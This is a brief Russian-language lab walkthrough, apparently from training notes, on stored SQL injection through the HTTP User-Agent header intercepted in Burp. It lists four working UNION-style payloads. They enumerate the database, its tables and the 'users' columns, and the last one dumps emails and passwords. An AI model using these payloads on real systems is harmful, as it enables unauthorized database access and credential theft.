---
title: SQL_Injection_-_Stored_User-Agent
sidebar_position: 1
---

# SQL Injection - Stored (User-Agent)

**(low)**


Грузить Payload’ы надо в user-agent перехваченный burp’ом подряд:

1', (select database() ))-- -

Название базы данных

1', (select group\_concat(table\_name)from information\_schema.tables where table\_schema=database()))-- -

Название таблицы

1', (select group\_concat(column\_name)from information\_schema.columns where table\_name='users'))-- -

Смотрим таблицу users

1', (select group\_concat(email,password) from users))-- -

Смотрим пароли и логины из этой таблицы

![](images/SQL_Injection_-_Stored_User-Agent_img_1.png)